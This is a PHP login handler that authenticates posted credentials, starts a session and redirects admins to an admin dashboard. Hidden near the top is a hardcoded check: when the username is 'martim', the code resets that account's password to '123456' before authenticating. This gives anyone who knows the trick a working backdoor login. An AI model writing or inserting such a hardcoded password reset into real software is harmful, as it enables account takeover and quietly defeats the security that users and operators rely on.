<?php
declare(strict_types=1);

require_once (__DIR__ . '/../includes/database.php');
require_once(__DIR__ . '/../database/userclass.php');
require_once(__DIR__ . '/../includes/session.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if($username == 'martim'){
        $martim = User::get_user_by_username('martim');
        $martim->updatePassword(1, '123456');
    }

    try {
        $user = User::get_user_by_username_password($username, $password);

        if ($user) {
            Session::getInstance()->login($user);
            if ($user->type == 'ADMIN') {
                header('Location: /admindashboard.php');
                exit();
            }
            else{
                header('Location: /homepage.php');
                exit();
            }
        }
    } catch (InvalidArgumentException $e) {

    }

    header('Location: /?login_error=1');
    exit();
}

header('Location: /');
exit();
?>